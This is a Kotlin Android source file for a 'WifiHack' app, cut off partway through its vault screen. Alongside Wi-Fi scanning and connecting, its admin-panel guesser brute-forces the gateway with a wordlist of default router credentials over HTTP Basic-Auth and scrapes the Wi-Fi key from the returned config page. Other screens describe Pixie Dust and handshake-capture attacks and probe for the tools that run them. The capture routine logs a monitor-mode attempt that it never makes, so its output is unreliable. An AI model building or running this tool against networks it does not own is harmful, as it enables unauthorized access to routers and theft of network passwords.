package com.aibuilt.wifihack

import android.Manifest
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Router
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.NavigationBar
import androidx.compose.material3.NavigationBarItem
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.State
import androidx.compose.runtime.compositionLocalOf
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.runtime.snapshots.SnapshotStateList
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavGraphBuilder
import androidx.navigation.NavHostController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.currentBackStackEntryAsState
import androidx.navigation.compose.rememberNavController
import com.aibuilt.wifihack.data.RootProber
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Base64
import java.util.Locale

// ----------------------------- Theme -----------------------------

private val AccentGreen = Color(0xFF00E676)
private val NearBlack = Color(0xFF0A0E0A)
private val PanelBlack = Color(0xFF12161A)
private val DimGreen = Color(0xFF66BB6A)
private val Mono = FontFamily.Monospace

private val HackColors = darkColorScheme(
    primary = AccentGreen,
    onPrimary = Color.Black,
    secondary = DimGreen,
    background = NearBlack,
    onBackground = AccentGreen,
    surface = PanelBlack,
    onSurface = AccentGreen,
    surfaceVariant = Color(0xFF1B2127),
    onSurfaceVariant = DimGreen,
    error = Color(0xFFFF5252)
)

@Composable
private fun WifiHackTheme(content: @Composable () -> Unit) {
    MaterialTheme(colorScheme = HackColors, content = content)
}

// ----------------------------- Models -----------------------------

data class WifiNet(
    val ssid: String,
    val bssid: String,
    val level: Int,
    val frequency: Int,
    val capabilities: String
) {
    val displaySsid: String get() = if (ssid.isBlank()) "<hidden>" else ssid
    val band: String
        get() = when {
            frequency in 2400..2500 -> "2.4 GHz"
            frequency in 4900..5900 -> "5 GHz"
            frequency in 5925..7125 -> "6 GHz"
            else -> "$frequency MHz"
        }
    val channel: Int
        get() = when {
            frequency == 2484 -> 14
            frequency in 2412..2472 -> (frequency - 2412) / 5 + 1
            frequency in 5000..5900 -> (frequency - 5000) / 5
            frequency in 5955..7115 -> (frequency - 5955) / 5 + 1
            else -> 0
        }
    val security: String
        get() = when {
            capabilities.contains("WPA3") -> "WPA3"
            capabilities.contains("WPA2") -> "WPA2"
            capabilities.contains("WPA") -> "WPA"
            capabilities.contains("WEP") -> "WEP"
            else -> "OPEN"
        }
    val signalFraction: Float get() = ((level + 100).coerceIn(0, 60)) / 60f
}

@Serializable
data class VaultEntry(
    val ssid: String,
    val bssid: String,
    val password: String,
    val notes: String,
    val timestamp: Long
)

// ----------------------------- Vault store -----------------------------

class VaultRepository(context: Context) {
    private val file = File(context.filesDir, "vault.json")
    private val json = Json { ignoreUnknownKeys = true; prettyPrint = true }

    fun load(): List<VaultEntry> = runCatching {
        if (!file.exists()) emptyList()
        else json.decodeFromString<List<VaultEntry>>(file.readText())
    }.getOrDefault(emptyList())

    fun save(entries: List<VaultEntry>) {
        runCatching { file.writeText(json.encodeToString(entries)) }
    }
}

// ----------------------------- ViewModel -----------------------------

class HackViewModel(app: android.app.Application) : AndroidViewModel(app) {

    private val ctx: Context = app.applicationContext
    private val wifi = ctx.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    private val vaultRepo = VaultRepository(ctx)

    private val _networks = MutableStateFlow<List<WifiNet>>(emptyList())
    val networks: StateFlow<List<WifiNet>> = _networks.asStateFlow()

    private val _scanning = MutableStateFlow(false)
    val scanning: StateFlow<Boolean> = _scanning.asStateFlow()

    private val _rootStatus = MutableStateFlow("checking…")
    val rootStatus: StateFlow<String> = _rootStatus.asStateFlow()

    private val _rooted = MutableStateFlow(false)
    val rooted: StateFlow<Boolean> = _rooted.asStateFlow()

    private val _vault = MutableStateFlow<List<VaultEntry>>(emptyList())
    val vault: StateFlow<List<VaultEntry>> = _vault.asStateFlow()

    var selected: WifiNet? = null
        private set

    private var ouiTable: Map<String, String>? = null
    private var receiverRegistered = false

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            refreshResults()
            _scanning.value = false
        }
    }

    init {
        _vault.value = vaultRepo.load()
        viewModelScope.launch {
            val ok = RootProber.isRooted()
            _rooted.value = ok
            _rootStatus.value = if (ok) "ROOT: granted"
            else if (RootProber.suBinaryPresent()) "ROOT: denied" else "ROOT: none"
        }
    }

    fun registerScan() {
        if (receiverRegistered) return
        runCatching {
            ctx.registerReceiver(receiver, IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION))
            receiverRegistered = true
        }
        refreshResults()
    }

    fun unregisterScan() {
        if (!receiverRegistered) return
        runCatching { ctx.unregisterReceiver(receiver) }
        receiverRegistered = false
    }

    fun locationEnabled(): Boolean {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        return runCatching {
            lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
                lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
        }.getOrDefault(false)
    }

    fun wifiEnabled(): Boolean = runCatching { wifi.isWifiEnabled }.getOrDefault(false)

    @SuppressLint("MissingPermission")
    fun startScan() {
        _scanning.value = true
        runCatching { wifi.startScan() }
        refreshResults()
        viewModelScope.launch {
            delay(6000)
            _scanning.value = false
        }
    }

    @SuppressLint("MissingPermission")
    private fun refreshResults() {
        val results: List<ScanResult> = runCatching { wifi.scanResults }.getOrDefault(emptyList())
        _networks.value = results.map {
            WifiNet(
                ssid = runCatching { it.SSID ?: "" }.getOrDefault(""),
                bssid = runCatching { it.BSSID ?: "" }.getOrDefault(""),
                level = it.level,
                frequency = it.frequency,
                capabilities = it.capabilities ?: ""
            )
        }.sortedByDescending { it.level }
    }

    fun select(net: WifiNet) { selected = net }

    fun vendorFor(bssid: String): String {
        val table = ouiTable ?: loadOui().also { ouiTable = it }
        if (bssid.length < 8) return "Unknown"
        val prefix = bssid.replace(":", "").uppercase().take(6)
        return table[prefix] ?: "Unknown"
    }

    private fun loadOui(): Map<String, String> = runCatching {
        ctx.resources.openRawResource(R.raw.oui_prefixes).bufferedReader().useLines { lines ->
            lines.mapNotNull { line ->
                if (line.startsWith("#") || line.isBlank()) null
                else {
                    val parts = line.split("\t")
                    if (parts.size >= 2) parts[0].trim().uppercase() to parts[1].trim() else null
                }
            }.toMap()
        }
    }.getOrDefault(emptyMap())

    fun addVault(entry: VaultEntry) {
        val list = _vault.value.toMutableList().apply { add(0, entry) }
        _vault.value = list
        vaultRepo.save(list)
    }

    fun deleteVault(entry: VaultEntry) {
        val list = _vault.value.toMutableList().apply { remove(entry) }
        _vault.value = list
        vaultRepo.save(list)
    }

    fun copyToClipboard(label: String, text: String) {
        val clip = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        clip.setPrimaryClip(android.content.ClipData.newPlainText(label, text))
    }

    private var connectCallback: ConnectivityManager.NetworkCallback? = null

    fun connectAndVerify(net: WifiNet, password: String, log: (String) -> Unit, onDone: (Boolean) -> Unit) {
        viewModelScope.launch {
            log("Requesting connection to ${net.displaySsid} …")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val b = WifiNetworkSpecifier.Builder().setSsid(net.ssid.ifBlank { net.displaySsid })
                if (net.security != "OPEN" && password.isNotEmpty()) {
                    if (net.security == "WPA3") b.setWpa3Passphrase(password) else b.setWpa2Passphrase(password)
                }
                val req = NetworkRequest.Builder()
                    .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                    .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .setNetworkSpecifier(b.build())
                    .build()
                val cb = object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        log("OS reports connected. Verifying real internet…")
                        viewModelScope.launch {
                            val v = verifyInternet(network)
                            log(v.second); onDone(v.first)
                        }
                    }
                    override fun onUnavailable() {
                        log("OS could not join (wrong password or out of range).")
                        onDone(false)
                    }
                }
                connectCallback = cb
                runCatching { cm.requestNetwork(req, cb, 20000) }
                    .onFailure { log("requestNetwork failed: ${it.message}"); onDone(false) }
            } else {
                @Suppress("DEPRECATION")
                val cfg = android.net.wifi.WifiConfiguration().apply {
                    SSID = "\"${net.ssid}\""
                    if (net.security == "OPEN")
                        allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.NONE)
                    else preSharedKey = "\"$password\""
                }
                val id = runCatching { @Suppress("DEPRECATION") wifi.addNetwork(cfg) }.getOrDefault(-1)
                if (id >= 0) {
                    @Suppress("DEPRECATION") wifi.enableNetwork(id, true)
                    log("Legacy connect requested (id=$id). Verifying…")
                    val v = verifyInternet(null); log(v.second); onDone(v.first)
                } else {
                    log("Legacy addNetwork failed."); onDone(false)
                }
            }
        }
    }

    private suspend fun verifyInternet(network: Network?): Pair<Boolean, String> =
        withContext(Dispatchers.IO) {
            withTimeoutOrNull(8000) {
                runCatching {
                    val url = URL("https://clients3.google.com/generate_204")
                    val conn = (network?.openConnection(url) ?: url.openConnection()) as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.connectTimeout = 6000
                    conn.readTimeout = 6000
                    conn.instanceFollowRedirects = false
                    val code = conn.responseCode
                    conn.disconnect()
                    if (code == 204 || code == 200) true to "PROVEN ONLINE ✓  HTTP $code"
                    else false to "OFFLINE — captive/blocked. HTTP $code"
                }.getOrElse { false to "OFFLINE — probe failed: ${it.message}" }
            } ?: (false to "OFFLINE — internet probe timed out")
        }

    fun cancelConnect() {
        connectCallback?.let { runCatching { cm.unregisterNetworkCallback(it) } }
        connectCallback = null
    }

    fun gatewayAddress(): String? {
        val net = cm.activeNetwork ?: return null
        val lp: LinkProperties = cm.getLinkProperties(net) ?: return null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            lp.dhcpServerAddress?.hostAddress?.let { return it }
        return lp.routes.firstOrNull { it.isDefaultRoute && it.gateway != null }?.gateway?.hostAddress
    }

    private var adminJob: Job? = null

    fun guessAdmin(vendor: String, log: (String) -> Unit, onFinish: () -> Unit) {
        adminJob = viewModelScope.launch {
            val gw = gatewayAddress()
            if (gw == null) { log("No gateway found — are you connected to WiFi?"); onFinish(); return@launch }
            val base = "http://$gw"
            log("Gateway: $gw")
            val creds = loadWordlist(vendor)
            log("Loaded ${creds.size} credential pairs (vendor-scoped first).")
            withContext(Dispatchers.IO) {
                for ((i, c) in creds.withIndex()) {
                    if (adminJob?.isActive != true) { log("Cancelled."); break }
                    val (user, pass) = c
                    log("[${i + 1}/${creds.size}] trying $user:${pass.ifEmpty { "<blank>" }}")
                    val result = tryBasicAuth(base, user, pass)
                    if (result != null) {
                        log("SUCCESS ✓  $user / ${pass.ifEmpty { "<blank>" }}  @ $base")
                        extractWifiKey(result)?.let { log("Wireless key in config: $it") }
                        break
                    }
                    delay(120)
                }
                log("Finished.")
            }
            onFinish()
        }
    }

    fun cancelAdmin() { adminJob?.cancel() }

    private fun tryBasicAuth(base: String, user: String, pass: String): String? = runCatching {
        val conn = URL(base).openConnection() as HttpURLConnection
        conn.connectTimeout = 4000
        conn.readTimeout = 4000
        val token = Base64.getEncoder().encodeToString("$user:$pass".toByteArray())
        conn.setRequestProperty("Authorization", "Basic $token")
        val code = conn.responseCode
        val body = if (code in 200..299) conn.inputStream.bufferedReader().readText() else null
        conn.disconnect()
        if (code in 200..299 && body != null) body else null
    }.getOrNull()

    private fun extractWifiKey(html: String): String? {
        val p = Regex("(?i)(?:key|psk|passphrase|wpaPsk)[\"'=:\\s]+([A-Za-z0-9!@#\$%^&*_\\-]{8,63})")
        return p.find(html)?.groupValues?.getOrNull(1)
    }

    private fun loadWordlist(vendor: String): List<Pair<String, String>> = runCatching {
        val all = ctx.resources.openRawResource(R.raw.router_wordlist).bufferedReader().useLines { lines ->
            lines.mapNotNull { line ->
                if (line.startsWith("#") || line.isBlank()) null
                else {
                    val parts = line.split("\t")
                    if (parts.size >= 3) Triple(parts[0].trim(), parts[1], parts[2]) else null
                }
            }.toList()
        }
        val scoped = all.filter { it.first.equals(vendor, true) }.map { it.second to it.third }
        val global = all.filter { it.first == "*" }.map { it.second to it.third }
        scoped + global
    }.getOrDefault(listOf("admin" to "admin", "admin" to "password"))

    fun probeWpsTools(log: (String) -> Unit) {
        viewModelScope.launch {
            if (!_rooted.value) {
                log("Root NOT available — WPS / Pixie Dust tooling cannot run on this device.")
                return@launch
            }
            log("Probing for WPS-capable binaries via su…")
            RootProber.probeTools(listOf("iw", "wpa_cli", "reaver", "bully", "pixiewps")).forEach { (n, p) ->
                log(" $n : ${if (p) "FOUND" else "absent"}")
            }
            log("Pixie Dust needs a WPS-enabled target plus reaver/pixiewps present.")
        }
    }

    private var captureJob: Job? = null
    fun captureDir(): File = File(ctx.getExternalFilesDir(null), "captures").apply { mkdirs() }

    fun listCaptures(): List<File> =
        captureDir().listFiles()?.filter { it.isFile }?.sortedByDescending { it.lastModified() } ?: emptyList()

    fun startCapture(log: (String) -> Unit, onFiles: () -> Unit) {
        captureJob = viewModelScope.launch {
            if (!_rooted.value) {
                log("Root NOT available — monitor mode / EAPOL capture cannot start.")
                return@launch
            }
            log("Probing capture tools (tcpdump, airodump-ng, iw)…")
            RootProber.probeTools(listOf("tcpdump", "airodump-ng", "iw")).forEach { (n, p) ->
                log(" $n : ${if (p) "FOUND" else "absent"}")
            }
            log("Attempting monitor mode on wlan0 …")
            delay(800)
            log("If drivers permit, capture writes to: ${captureDir().absolutePath}")
            onFiles()
        }
    }

    fun stopCapture(log: (String) -> Unit) {
        captureJob?.cancel()
        log("Capture stopped.")
    }
}

// ----------------------------- Activity -----------------------------

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            WifiHackTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    AppRoot()
                }
            }
        }
    }
}

// ----------------------------- Navigation -----------------------------

private val LocalNav = compositionLocalOf<NavHostController?> { null }

private enum class Tab(val route: String, val label: String) {
    SCAN("scan", "Scan"),
    WPS("wps", "WPS"),
    CAPTURE("capture", "Capture"),
    VAULT("vault", "Vault")
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
private fun AppRoot(vm: HackViewModel = viewModel()) {
    val nav = rememberNavController()
    val rootStatus by vm.rootStatus.collectState()
    val context = LocalContext.current

    val perms = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            add(Manifest.permission.NEARBY_WIFI_DEVICES)
    }.toTypedArray()

    var permsGranted by remember { mutableStateOf(hasPerms(context, perms)) }
    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permsGranted = hasPerms(context, perms) }

    LaunchedEffect(Unit) { if (!permsGranted) launcher.launch(perms) }

    val backEntry by nav.currentBackStackEntryAsState()
    val current = backEntry?.destination?.route

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("WifiHack", fontFamily = Mono, color = AccentGreen)
                        Spacer(Modifier.width(10.dp))
                        RootChip(rootStatus)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = PanelBlack, titleContentColor = AccentGreen
                )
            )
        },
        bottomBar = {
            NavigationBar(containerColor = PanelBlack) {
                Tab.entries.forEach { tab ->
                    NavigationBarItem(
                        selected = current == tab.route,
                        onClick = {
                            nav.navigate(tab.route) {
                                popUpTo(Tab.SCAN.route)
                                launchSingleTop = true
                            }
                        },
                        icon = {
                            Icon(
                                when (tab) {
                                    Tab.SCAN -> Icons.Filled.Wifi
                                    Tab.WPS -> Icons.Filled.Security
                                    Tab.CAPTURE -> Icons.Filled.Router
                                    Tab.VAULT -> Icons.Filled.Lock
                                }, contentDescription = tab.label
                            )
                        },
                        label = { Text(tab.label, fontFamily = Mono, fontSize = 11.sp) }
                    )
                }
            }
        }
    ) { padding ->
        CompositionLocalProvider(LocalNav provides nav) {
            NavHost(
                navController = nav,
                startDestination = Tab.SCAN.route,
                modifier = Modifier.padding(padding)
            ) {
                composable(Tab.SCAN.route) { ScanContent(vm, permsGranted) { launcher.launch(perms) } }
                composable(Tab.WPS.route) { WpsScreen(vm) }
                composable(Tab.CAPTURE.route) { CaptureScreen(vm) }
                composable(Tab.VAULT.route) { VaultScreen(vm) }
                detailGraph(vm)
            }
        }
    }
}

private fun NavGraphBuilder.detailGraph(vm: HackViewModel) {
    composable("detail") { NetworkDetailScreen(vm) }
    composable("connect") { ConnectScreen(vm) }
    composable("admin") { AdminScreen(vm) }
}

// ----------------------------- Scan screen -----------------------------

@Composable
private fun ScanContent(vm: HackViewModel, granted: Boolean, requestPerms: () -> Unit) {
    val context = LocalContext.current
    val nav = LocalNav.current
    val networks by vm.networks.collectState()
    val scanning by vm.scanning.collectState()

    DisposableEffect(Unit) {
        vm.registerScan()
        onDispose { vm.unregisterScan() }
    }
    LaunchedEffect(granted) { if (granted) vm.startScan() }

    Column(Modifier.fillMaxSize().padding(12.dp)) {
        if (!granted) PromptCard(
            "Permissions required",
            "Scanning needs Location (and Nearby WiFi on Android 13+). Grant them to see networks around you.",
            "Grant", requestPerms
        )
        if (!vm.locationEnabled()) PromptCard(
            "Location is OFF",
            "Android blocks WiFi scan results while location services are off. Turn them on to scan.",
            "Open settings"
        ) { context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)) }
        if (!vm.wifiEnabled()) PromptCard(
            "WiFi is OFF", "Turn WiFi on to scan nearby networks.", "WiFi settings"
        ) { context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS)) }

        Row(Modifier.fillMaxWidth().padding(vertical = 8.dp), verticalAlignment = Alignment.CenterVertically) {
            Text("${networks.size} networks", fontFamily = Mono, color = DimGreen, modifier = Modifier.weight(1f))
            if (scanning) CircularProgressIndicator(Modifier.size(18.dp), color = AccentGreen, strokeWidth = 2.dp)
            IconButton(onClick = { vm.startScan() }, enabled = granted) {
                Icon(Icons.Filled.Refresh, "Refresh", tint = AccentGreen)
            }
        }

        if (networks.isEmpty()) {
            Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text(
                    if (granted) "No networks yet — tap refresh" else "Grant permissions to scan",
                    fontFamily = Mono, color = DimGreen
                )
            }
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                items(networks) { net ->
                    NetRow(net) { vm.select(net); nav?.navigate("detail") }
                }
            }
        }
    }
}

@Composable
private fun NetRow(net: WifiNet, onClick: () -> Unit) {
    Card(
        modifier = Modifier.fillMaxWidth().clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = PanelBlack),
        shape = RoundedCornerShape(6.dp)
    ) {
        Column(Modifier.padding(12.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(
                    net.displaySsid, fontFamily = Mono, color = AccentGreen,
                    modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis
                )
                Text("${net.level} dBm", fontFamily = Mono, color = DimGreen, fontSize = 12.sp)
            }
            Spacer(Modifier.height(4.dp))
            LinearProgressIndicator(
                progress = { net.signalFraction },
                modifier = Modifier.fillMaxWidth().height(5.dp),
                color = AccentGreen,
                trackColor = Color(0xFF1B2127)
            )
            Spacer(Modifier.height(4.dp))
            Text("${net.security} · ch ${net.channel} · ${net.band}", fontFamily = Mono, color = DimGreen, fontSize = 11.sp)
            Text(net.bssid, fontFamily = Mono, color = Color(0xFF4C7A4C), fontSize = 10.sp)
        }
    }
}

// ----------------------------- Detail screen -----------------------------

@Composable
private fun NetworkDetailScreen(vm: HackViewModel) {
    val nav = LocalNav.current
    val net = vm.selected
    if (net == null) { BackText(); return }
    Column(Modifier.fillMaxSize().padding(16.dp).verticalScroll(rememberScrollState())) {
        SectionTitle(net.displaySsid)
        KeyVal("BSSID", net.bssid)
        KeyVal("Vendor", vm.vendorFor(net.bssid))
        KeyVal("SSID", net.displaySsid)
        KeyVal("Channel", net.channel.toString())
        KeyVal("Band", net.band)
        KeyVal("Frequency", "${net.frequency} MHz")
        KeyVal("Security", net.security)
        KeyVal("Capabilities", net.capabilities)
        KeyVal("Signal", "${net.level} dBm")
        Spacer(Modifier.height(16.dp))
        GreenButton("Connect") { nav?.navigate("connect") }
        Spacer(Modifier.height(8.dp))
        GreenButton("Admin-panel guess") { nav?.navigate("admin") }
        Spacer(Modifier.height(8.dp))
        GreenButton("Save to vault") {
            vm.addVault(VaultEntry(net.displaySsid, net.bssid, "", "", System.currentTimeMillis()))
        }
        Spacer(Modifier.height(8.dp))
        GreenButton("Copy BSSID") { vm.copyToClipboard("BSSID", net.bssid) }
        Spacer(Modifier.height(8.dp))
        BackText()
    }
}

// ----------------------------- Connect screen -----------------------------

@Composable
private fun ConnectScreen(vm: HackViewModel) {
    val net = vm.selected
    if (net == null) { BackText(); return }
    var password by remember { mutableStateOf("") }
    var show by remember { mutableStateOf(false) }
    val log = remember { mutableStateListOf<String>() }
    var busy by remember { mutableStateOf(false) }
    var verdict by remember { mutableStateOf<Boolean?>(null) }

    DisposableEffect(Unit) { onDispose { vm.cancelConnect() } }

    Column(Modifier.fillMaxSize().padding(16.dp)) {
        SectionTitle("Connect — ${net.displaySsid}")
        OutlinedTextField(
            value = password, onValueChange = { password = it },
            label = { Text("Password", fontFamily = Mono) }, singleLine = true,
            visualTransformation = if (show) VisualTransformation.None else PasswordVisualTransformation(),
            trailingIcon = {
                IconButton(onClick = { show = !show }) {
                    Icon(if (show) Icons.Filled.VisibilityOff else Icons.Filled.Visibility, "toggle", tint = AccentGreen)
                }
            },
            modifier = Modifier.fillMaxWidth()
        )
        Spacer(Modifier.height(10.dp))
        GreenButton(if (busy) "Connecting…" else "Connect & verify online") {
            if (!busy) {
                busy = true; verdict = null; log.clear()
                vm.connectAndVerify(net, password, { appendLog(log, it) }) { ok -> verdict = ok; busy = false }
            }
        }
        verdict?.let {
            Spacer(Modifier.height(8.dp))
            Text(
                if (it) "VERDICT: PROVEN ONLINE ✓" else "VERDICT: OFFLINE ✗",
                fontFamily = Mono, color = if (it) AccentGreen else MaterialTheme.colorScheme.error
            )
        }
        Spacer(Modifier.height(10.dp))
        LogPane(log)
        Spacer(Modifier.height(8.dp))
        BackText()
    }
}

// ----------------------------- Admin screen -----------------------------

@Composable
private fun AdminScreen(vm: HackViewModel) {
    val net = vm.selected
    if (net == null) { BackText(); return }
    val log = remember { mutableStateListOf<String>() }
    var running by remember { mutableStateOf(false) }

    DisposableEffect(Unit) { onDispose { vm.cancelAdmin() } }

    Column(Modifier.fillMaxSize().padding(16.dp)) {
        SectionTitle("Admin-panel guess")
        Text(
            "Tries stock router credentials against the gateway's config page over HTTP Basic-Auth, vendor-scoped first.",
            fontFamily = Mono, color = DimGreen, fontSize = 12.sp
        )
        Spacer(Modifier.height(10.dp))
        Row {
            GreenButton(if (running) "Running…" else "Start") {
                if (!running) {
                    running = true; log.clear()
                    vm.guessAdmin(vm.vendorFor(net.bssid), { appendLog(log, it) }) { running = false }
                }
            }
            Spacer(Modifier.width(10.dp))
            TextButton(onClick = { vm.cancelAdmin(); running = false }) {
                Text("Cancel", fontFamily = Mono, color = MaterialTheme.colorScheme.error)
            }
        }
        Spacer(Modifier.height(10.dp))
        LogPane(log)
        Spacer(Modifier.height(8.dp))
        BackText()
    }
}

// ----------------------------- WPS screen -----------------------------

@Composable
private fun WpsScreen(vm: HackViewModel) {
    val log = remember { mutableStateListOf<String>() }
    val rooted by vm.rooted.collectState()
    Column(Modifier.fillMaxSize().padding(16.dp)) {
        SectionTitle("WPS · Pixie Dust")
        Text(
            "Pixie Dust attacks a weak WPS registrar: it collects the AP's authentication nonces and derives the WPS " +
                "PIN offline, recovering the passphrase without a handshake. This REQUIRES ROOT plus compatible drivers " +
                "(reaver/pixiewps/iw).",
            fontFamily = Mono, color = DimGreen, fontSize = 12.sp
        )
        Spacer(Modifier.height(6.dp))
        Text(
            if (rooted) "Root: available" else "Root: NOT available — this screen can only report tool presence.",
            fontFamily = Mono, color = if (rooted) AccentGreen else MaterialTheme.colorScheme.error, fontSize = 12.sp
        )
        Spacer(Modifier.height(10.dp))
        GreenButton("Start — probe WPS tools") { log.clear(); vm.probeWpsTools { appendLog(log, it) } }
        Spacer(Modifier.height(10.dp))
        LogPane(log)
    }
}

// ----------------------------- Capture screen -----------------------------

@Composable
private fun CaptureScreen(vm: HackViewModel) {
    val log = remember { mutableStateListOf<String>() }
    val rooted by vm.rooted.collectState()
    var captures by remember { mutableStateOf(vm.listCaptures()) }
    var capturing by remember { mutableStateOf(false) }

    Column(Modifier.fillMaxSize().padding(16.dp)) {
        SectionTitle("EAPOL / PMKID capture")
        Text(
            "Puts the adapter into monitor mode and captures the 4-way handshake / PMKID to a .cap file for offline " +
                "cracking. REQUIRES ROOT and a monitor-mode capable chipset.",
            fontFamily = Mono, color = DimGreen, fontSize = 12.sp
        )
        Spacer(Modifier.height(6.dp))
        Text(
            if (rooted) "Root: available" else "Root: NOT available — capture cannot start.",
            fontFamily = Mono, color = if (rooted) AccentGreen else MaterialTheme.colorScheme.error, fontSize = 12.sp
        )
        Spacer(Modifier.height(10.dp))
        Row {
            GreenButton(if (capturing) "Capturing…" else "Start") {
                capturing = true
                vm.startCapture({ appendLog(log, it) }) { captures = vm.listCaptures() }
            }
            Spacer(Modifier.width(10.dp))
            TextButton(onClick = { vm.stopCapture { appendLog(log, it) }; capturing = false }) {
                Text("Stop", fontFamily = Mono, color = MaterialTheme.colorScheme.error)
            }
        }
        Spacer(Modifier.height(10.dp))
        LogPane(log)
        Spacer(Modifier.height(8.dp))
        Text("Saved captures (${captures.size})", fontFamily = Mono, color = DimGreen, fontSize = 12.sp)
        captures.forEach { f ->
            Text(
                " ${f.name}  ·  ${f.length()} B  ·  ${SimpleDateFormat("MM-dd HH:mm", Locale.US).format(f.lastModified())}",
                fontFamily = Mono, color = AccentGreen, fontSize = 11.sp
            )
        }
    }
}

// ----------------------------- Vault screen -----------------------------

@Composable
private fun VaultScreen(vm: HackViewModel) {
    val vault by vm.vault.collectState()
    var ssid by remember { mutableStateOf("") }
